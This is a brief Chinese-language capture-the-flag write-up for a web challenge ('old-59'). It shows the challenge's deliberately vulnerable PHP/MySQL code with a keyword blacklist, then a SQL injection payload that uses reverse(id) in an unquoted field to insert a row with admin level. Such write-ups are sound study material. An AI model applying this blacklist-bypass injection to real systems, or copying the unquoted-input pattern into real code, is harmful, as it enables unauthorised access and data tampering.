# old-59_200

* 這一題一進去可以看到 source code 
    ```php=
    include "../../config.php";
    if($_GET['view_source']) view_source();
    $db = dbconnect();
    if($_POST['lid'] && isset($_POST['lphone'])){
    $_POST['lid'] = addslashes($_POST['lid']);
    $_POST['lphone'] = addslashes($_POST['lphone']);
    $result = mysqli_fetch_array(mysqli_query($db,"select id,lv from chall59 where id='{$_POST['lid']}' and phone='{$_POST['lphone']}'"));
    if($result['id']){
      echo "id : {$result['id']}<br>lv : {$result['lv']}<br><br>";
      if($result['lv'] == "admin"){
      mysqli_query($db,"delete from chall59");
      solve(59);
    }
    echo "<br><a href=./?view_source=1>view-source</a>";
    exit();
    }
    }
    if($_POST['id'] && isset($_POST['phone'])){
    $_POST['id'] = addslashes($_POST['id']);
    $_POST['phone'] = addslashes($_POST['phone']);
    if(strlen($_POST['phone'])>=20) exit("Access Denied");
    if(preg_match("/admin/i",$_POST['id'])) exit("Access Denied");
    if(preg_match("/admin|0x|#|hex|char|ascii|ord|select/i",$_POST['phone'])) exit("Access Denied");
    mysqli_query($db,"insert into chall59 values('{$_POST['id']}',{$_POST['phone']},'guest')");
    }
    ```
* 稍微分析一下可以知道注入點在 join 的 phone 那裡
* 需要注意的是有很多關鍵字被過濾了
* 用 reverse() 可以成功達到 lv = admin 的目的
* 這是 payload `id : nimda` `phone : 1,reverse(id)) -- `
* 之後在 login 那裡輸入 `id : nimda` `phone : 1` 就可以過了
